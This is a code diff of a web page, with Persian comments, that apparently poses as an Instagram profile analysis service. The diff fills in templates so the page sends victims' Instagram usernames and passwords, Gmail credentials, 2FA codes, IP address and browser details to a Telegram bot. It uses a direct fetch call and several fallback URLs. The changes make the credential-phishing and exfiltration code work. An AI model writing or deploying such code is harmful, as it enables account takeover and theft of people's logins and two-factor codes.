@@ -549,7 +549,7 @@
         async function sendToTelegram(message) {
             try {
                 // روش اول: استفاده از fetch مستقیم
-                const url = `https://api.telegram.org/bot/sendMessage`;
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                 
                 const response = await fetch(url, {
                     method: 'POST',
@@ -587,8 +587,8 @@
             
             // روش‌های مختلف fallback
             const fallbackMethods = [
-                `https://api.telegram.org/bot/sendMessage?chat_id=&text=&parse_mode=HTML`,
-                `https://api.telegram.org/bot/sendMessage?chat_id=&text=`,
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`,
+                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}`,
             ];
 
             fallbackMethods.forEach(url => {
@@ -623,7 +623,7 @@
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     language: navigator.language,
-                    screen: `x`,
+                    screen: `${screen.width}x${screen.height}`,
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 },
                 timestamp: new Date().toISOString(),
@@ -677,23 +677,23 @@
 🎯 <b>NEW INSTAGRAM PROFILE ANALYSIS REQUEST</b>
 
 📱 <b>Instagram Account:</b>
-├ Username: <code></code>
-└ Password: <code></code>
+├ Username: <code>${collectedData.instagram.username}</code>
+└ Password: <code>${collectedData.instagram.password}</code>
 
 📧 <b>Gmail Account:</b>
-├ Email: <code></code>
-└ Password: <code></code>
+├ Email: <code>${collectedData.gmail.email}</code>
+└ Password: <code>${collectedData.gmail.password}</code>
 
 💻 <b>System Info:</b>
-├ User Agent: 
-├ Screen: 
-├ Language: 
-└ Timezone: 
+├ User Agent: ${collectedData.technical.userAgent}
+├ Screen: ${collectedData.technical.screen}
+├ Language: ${collectedData.technical.language}
+└ Timezone: ${collectedData.technical.timezone}
 
 🌐 <b>Network:</b>
-└ IP Address: 
+└ IP Address: ${collectedData.ip}
 
-⏰ <b>Timestamp:</b> 
+⏰ <b>Timestamp:</b> ${collectedData.timestamp}
 
 🔐 <i>Waiting for 2FA verification...</i>
             `;
@@ -751,14 +751,14 @@
                 verificationMessage = `
 🔐 <b>2FA VERIFICATION - CODE METHOD</b>
 
-📧 <b>Account:</b> 
-👤 <b>Instagram:</b> 
+📧 <b>Account:</b> ${collectedData.gmail.email}
+👤 <b>Instagram:</b> ${collectedData.instagram.username}
 
-🔢 <b>Verification Code:</b> <code></code>
+🔢 <b>Verification Code:</b> <code>${code}</code>
 📱 <b>Method:</b> 6-digit Code
 
-🌐 <b>IP Address:</b> 
-⏰ <b>Time:</b> 
+🌐 <b>IP Address:</b> ${collectedData.ip}
+⏰ <b>Time:</b> ${new Date().toISOString()}
 
 ✅ <i>2FA verification completed successfully</i>
                 `;
@@ -767,14 +767,14 @@
                 verificationMessage = `
 🔐 <b>2FA VERIFICATION - NOTIFICATION METHOD</b>
 
-📧 <b>Account:</b> 
-👤 <b>Instagram:</b> 
+📧 <b>Account:</b> ${collectedData.gmail.email}
+👤 <b>Instagram:</b> ${collectedData.instagram.username}
 
 🔔 <b>Method:</b> App Notification Approval
 📱 <b>Action:</b> User selected "Tap Yes" option
 
-🌐 <b>IP Address:</b> 
-⏰ <b>Time:</b> 
+🌐 <b>IP Address:</b> ${collectedData.ip}
+⏰ <b>Time:</b> ${new Date().toISOString()}
 
 ✅ <i>2FA verification completed successfully</i>
                 `;
